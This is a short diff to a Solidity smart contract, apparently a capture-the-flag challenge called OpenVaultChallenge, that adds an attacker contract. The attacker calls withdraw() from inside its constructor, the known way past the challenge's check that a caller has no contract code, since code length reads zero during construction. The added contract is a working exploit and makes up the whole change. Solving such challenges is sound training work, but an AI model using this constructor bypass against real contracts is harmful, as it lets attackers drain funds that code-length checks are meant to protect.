@@ -27,3 +27,12 @@ contract OpenVaultChallenge {
         return _account.code.length > 0;
     }
 }
+
+contract OpenVaultChallengeAttacker {
+    OpenVaultChallenge openVaultContract;
+
+    constructor(OpenVaultChallenge _contract) public {
+        openVaultContract = _contract;
+        openVaultContract.withdraw();
+    }
+}
